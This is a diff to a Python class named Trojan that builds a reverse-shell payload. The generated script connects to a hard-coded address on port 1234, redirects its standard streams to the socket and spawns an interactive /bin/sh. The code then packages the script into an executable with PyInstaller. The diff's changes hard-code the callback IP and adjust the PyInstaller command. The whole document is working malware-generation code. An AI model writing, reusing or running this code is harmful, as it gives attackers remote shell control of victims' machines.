@@ -12,14 +12,14 @@ class Trojan:
         with open("payload.py", "w") as f:
             f.write("import socket,subprocess,os\n")
             f.write("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
-            f.write(f"s.connect(({self.ip}, 1234))\n")
+            f.write(f"s.connect(('192.168.2.163', 1234))\n")
             f.write("os.dup2(s.fileno(), 0)\n")
             f.write("os.dup2(s.fileno(), 1)\n")
             f.write("os.dup2(s.fileno(), 2)\n")
             f.write("p = subprocess.call([\"/bin/sh\", \"-i\"])\n")
 
         # Use PyInstaller to create an executable from the script
-        os.system("pyinstaller payload.py")
+        os.system("python -m PyInstaller payload.py")
 
         # Return the path to the executable file
         return "dist/payload"
